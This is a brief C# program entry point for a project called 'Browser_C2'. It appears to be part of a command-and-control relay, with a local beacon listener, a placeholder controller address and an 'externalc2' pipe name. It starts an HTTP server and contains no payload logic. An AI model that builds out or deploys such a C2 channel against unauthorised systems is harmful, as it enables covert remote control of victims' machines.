using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
namespace Browser_C2
{
    class Program

    {

        public static string BeaconURL = "http://127.0.0.1:9828/";
        public static string AllowedOrigin = "127.0.0.1:9828";
        public static string ControllerURL = "http://x.x.x.x:8080/";
        public static string PipeName = "externalc2";

    
        static void Main(string[] args)
        {
            
             HTTP _http = new HTTP();
            _http.AllowedOrigin = AllowedOrigin;
            _http.Prefix = BeaconURL;
            _http.StartServer();


        }
    }
}
